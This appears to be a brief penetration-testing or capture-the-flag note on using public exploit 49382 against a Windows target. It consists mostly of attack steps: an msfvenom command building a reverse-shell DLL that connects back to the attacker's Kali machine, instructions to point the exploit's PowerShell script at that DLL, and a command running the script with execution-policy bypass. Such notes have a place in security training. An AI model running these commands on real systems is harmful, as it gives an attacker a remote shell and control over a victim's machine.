exploit 49382


Looking at the script we see the need to generate a reverse shell .dll payload. Then execute the .ps1 targeting the .dll.

```bash - kali
sudo msfvenom -p windows/shell_reverse_tcp -f dll -o shell.dll LHOST=$KALI LPORT=445
```

Edit the .ps1 to target the location of the .dll.

![[Pasted image 20220404152727.png]]

Upload both, the dll and ps1 file to target.

```command prompt - windows
powershell.exe -ep bypass .\49382.ps1
```




